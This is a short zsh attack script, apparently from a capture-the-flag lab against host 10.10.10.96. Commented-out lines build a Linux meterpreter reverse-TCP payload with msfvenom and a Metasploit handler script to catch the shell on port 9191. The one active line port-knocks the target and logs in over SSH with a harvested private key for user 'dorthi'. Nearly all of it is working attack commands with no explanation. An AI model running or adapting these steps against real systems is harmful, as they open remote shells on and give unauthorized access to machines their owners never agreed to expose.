#!/bin/zsh

#GREEN='\033[0;32m'
#NC='\033[0m'

#ip=$(ifconfig tun0 | grep inet | head -1 | xargs | cut -d " " -f 2)
#echo -e "${GREEN}[*]${NC} Creating the ELF file..."
#msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=9191 -f elf -o dump/lol.elf &> /dev/null
#echo -e "${GREEN}[*]${NC} Creating ruby script..."
#echo 'use exploit/multi/handler' > dump/script.rb
#echo 'set payload linux/x64/meterpreter/reverse_tcp' >> dump/script.rb
#echo 'set LHOST tun0' >> dump/script.rb
#echo 'set LPORT 9191' >> dump/script.rb
#echo 'base64 -w 0 lol.elf | copy' >> dump/script.rb
#echo 'run -j' >> dump/script.rb
#echo -e "${GREEN}[*]${NC} Trying SSH..."
knock -u 10.10.10.96 40809 50212 46969; ssh -i dump/id_rsa dorthi@10.10.10.96
